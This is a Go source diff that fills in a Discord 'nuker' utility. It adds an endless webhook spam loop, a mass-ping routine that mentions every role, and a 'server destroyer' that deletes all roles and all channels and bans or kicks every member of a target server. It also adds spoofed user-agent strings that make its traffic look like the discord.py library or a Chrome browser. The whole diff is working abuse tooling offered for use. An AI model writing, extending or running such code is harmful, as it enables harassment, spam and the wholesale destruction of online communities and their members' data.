@@ -1,7 +1,10 @@
 package main
 
 import (
+	"bytes"
 	"fmt"
+	"net/http"
+	"net/url"
 	"os"
 	"os/signal"
 	"strconv"
@@ -13,7 +16,8 @@ import (
 )
 
 const (
-	CLOAK = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
+	BOT_CLOAK  = "DiscordBot (https://github.com/Rapptz/discord.py 0.2) Python/3.9 aiohttp/2.3"
+	USER_CLOAK = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
 )
 
 var (
@@ -101,6 +105,17 @@ func massSend(content string, channels []*discordgo.Channel, count int, pretty f
 	return nil
 }
 
+func getContent(content *string, restart *bool) {
+	msg := "you must provide a content value."
+	ct := getInput("message content:", true, &msg)
+	if len(ct) > 2000 {
+		errorPr("content length cannot be above 2000; restarting.")
+		*restart = true
+	} else {
+		*content = ct
+	}
+}
+
 func massPing() error {
 	var mainGuildId string // main guild -> all channels are in!!!
 	var channels []*discordgo.Channel
@@ -127,6 +142,9 @@ func massPing() error {
 		guildRoles, e := discord.GuildRoles(mainGuildId)
 		*err = e
 		for _, gR := range guildRoles {
+			if gR.Name == "@everyone" {
+				continue
+			}
 			pingString += gR.Mention()
 		}
 		*finished = true
@@ -145,7 +163,72 @@ func massPing() error {
 }
 
 func webhookSpam() error {
-	return nil
+	webhookString := getInput("enter a webhook url:", true, nil)
+	webhookUrl, err := url.Parse(webhookString)
+	if err != nil {
+		errorPr("invalid url; restarting.")
+		return webhookSpam()
+	}
+	restart := false
+	err = loading("confirming webhook validity...", func(finished *bool, err *error) {
+		_, e := http.Get(webhookUrl.String())
+		if e != nil {
+			restart = true
+			*err = discordgo.ErrNilState
+		}
+		*finished = true
+	})
+	if restart {
+		errorPr("\nfailed to fetch data from webhook; restarting.")
+		return webhookSpam()
+	}
+	if err != nil {
+		return err
+	}
+
+	var content string
+	getContent(&content, &restart)
+	if restart {
+		return webhookSpam()
+	}
+
+	username := getInput("username for the webhook user:", false, nil)
+	iconUrl := getInput("icon (url) for the webhook user:", false, nil)
+
+	faces := []string{
+		"🎆",
+		"🎉",
+		"✨",
+	}
+	face := 0
+
+	cnt := 0
+	fmt.Print("\n")
+	for {
+		var jsonStr = []byte(fmt.Sprintf(`{"content": "%s", "username": "%s", "avatar_url": "%s"}`, content, username, iconUrl))
+		req, err := http.NewRequest("POST", webhookUrl.String(), bytes.NewBuffer(jsonStr))
+		if err != nil {
+			return err
+		}
+		req.Header.Set("Content-Type", "application/json")
+		_, err = http.DefaultClient.Do(req)
+		if err != nil {
+			return err
+		}
+		face++
+		if face == len(faces) {
+			face = 0
+		}
+		if cnt > 0 {
+			clearLine(1)
+		}
+		SuccessColour.Printf("%s spamming... (ctrl+c to stop)\n", faces[face])
+		face++
+		if face == len(faces) {
+			face = 0
+		}
+		cnt++
+	}
 }
 
 func textChannelSpam() error {
@@ -160,10 +243,9 @@ func textChannelSpam() error {
 		return textChannelSpam()
 	}
 
-	msg := "you must provide a content value."
-	content := getInput("message content:", true, &msg)
-	if len(content) > 2000 {
-		errorPr("content length cannot be above 2000; restarting.")
+	var content string
+	getContent(&content, &restart)
+	if restart {
 		return textChannelSpam()
 	}
 
@@ -189,7 +271,145 @@ func serverDestroy() error {
 	if !isBot {
 		errorPr("how did we get here?")
 	}
+
+	msg := "you must provide a server id."
+	guild, err := discord.Guild(getInput("server id:", true, &msg))
+	if err != nil {
+		//print(err.Error())
+		errorPr("invalid server id; restarting.")
+		return serverDestroy()
+	}
+
+	var roles []*discordgo.Role
+	var channels []*discordgo.Channel
+	var members []*discordgo.Member
+	err = loading("fetching server data...", func(finished *bool, err *error) {
+		roles, _ = discord.GuildRoles(guild.ID)
+		channels, _ = discord.GuildChannels(guild.ID)
+		ms, e := discord.GuildMembers(guild.ID, "", 1000)
+		members = ms
+		if e != nil {
+			*err = e
+		}
+		*finished = true
+	})
+	if err != nil {
+		return err
+	}
+
+	missingPerms := `HTTP 403 Forbidden, {"message": "Missing Permissions", "code": 50013}`
+
+	// all roles
+	missingRolePerms := false
+	err = progressBar("deleting all roles...", func(length, done *int, err *error) {
+		*length = len(roles)
+		*done = 0
+		for r, role := range roles {
+			if role.Name != "@everyone" && !role.Managed {
+				e := discord.GuildRoleDelete(guild.ID, role.ID)
+				if e != nil {
+					// cheap and easy
+					if e.Error() == missingPerms {
+						missingRolePerms = true
+					} else {
+						*err = e
+						return
+					}
+				}
+			}
+			*done = r + 1
+		}
+	})
+	if err != nil {
+		return err
+	}
+
+	// all channels
+	missingChannelPerms := false
+	err = progressBar("deleting all channels...", func(length, done *int, err *error) {
+		*length = len(channels)
+		*done = 0
+		for c, channel := range channels {
+			_, e := discord.ChannelDelete(channel.ID)
+			if e != nil {
+				print(e.Error())
+				if e.Error() == missingPerms {
+					missingChannelPerms = true
+				} else {
+					*err = e
+					return
+				}
+			}
+			*done = c + 1
+		}
+	})
+	if err != nil {
+		return err
+	}
+
+	// all members
+	missingKickPerms := false
+	err = progressBar("banning/kicking all members...", func(length, done *int, err *error) {
+		*length = len(members)
+		*done = 0
+		for m, member := range members {
+			e := discord.GuildBanCreate(guild.ID, member.User.ID, 0)
+			if e != nil {
+				// attempt to kick if can't ban
+				e = discord.GuildMemberDelete(guild.ID, member.User.ID)
+				if e.Error() == missingPerms {
+					missingKickPerms = true
+				} else {
+					*err = e
+					return
+				}
+			}
+			*done = m + 1
+		}
+	})
+	if err != nil {
+		return err
+	}
+
+	if missingRolePerms {
+		errorPr("\nnot all roles were removed due to missing perms.")
+	}
+	if missingChannelPerms {
+		errorPr("\nnot all channels were removed due to missing perms.")
+	}
+	if missingKickPerms {
+		errorPr("\nnot all members were kicked/banned due to missing perms.")
+	}
+
 	return nil
+}
+
+func pick() {
+	// all sections
+	options := []string{
+		"mass pinger", "webhook spammer", "text channel spammer", "server destroyer",
+	}
+	if !isBot {
+		options[len(options)-1] = ""
+	}
+	section := fromSelection("which tool do you wish to use?", options)
+	var err error
+	switch section {
+	case 0:
+		err = massPing()
+	case 1:
+		err = webhookSpam()
+	case 2:
+		err = textChannelSpam()
+	case 3:
+		err = serverDestroy()
+	}
+	if err != nil {
+		fatal("\nan error occured: '" + err.Error() + "'.\n")
+	} else {
+		message("\nfinished.")
+		pick() // loop
+	}
 }
 
 func main() {
@@ -213,7 +433,11 @@ func main() {
 		return
 	} else {
 		discord = cord
-		discord.UserAgent = CLOAK
+		if isBot {
+			discord.UserAgent = BOT_CLOAK
+		} else {
+			discord.UserAgent = USER_CLOAK
+		}
 		// loading slash
 		err := loading("connecting to discord...", func(finished *bool, err *error) {
 			_, e := discord.User("@me")
@@ -227,29 +451,6 @@ func main() {
 			success("\nsuccessfully connected.")
 		}
 	}
-	// all sections
-	options := []string{
-		"mass pinger", "webhook spammer", "text channel spammer",
-		"server destroyer",
-	}
-	if !isBot {
-		options[len(options)-1] = ""
-	}
-	section := fromSelection("which tool do you wish to use?", options)
-	var err error
-	switch section {
-	case 0:
-		err = massPing()
-	case 1:
-		err = webhookSpam()
-	case 2:
-		err = textChannelSpam()
-	case 3:
-		err = serverDestroy()
-	}
-	if err != nil {
-		fatal("\nan error occured: '" + err.Error() + "'.\n")
-	} else {
-		message("\nfinished successfully.\n")
-	}
+	// open looping picker
+	pick()
 }
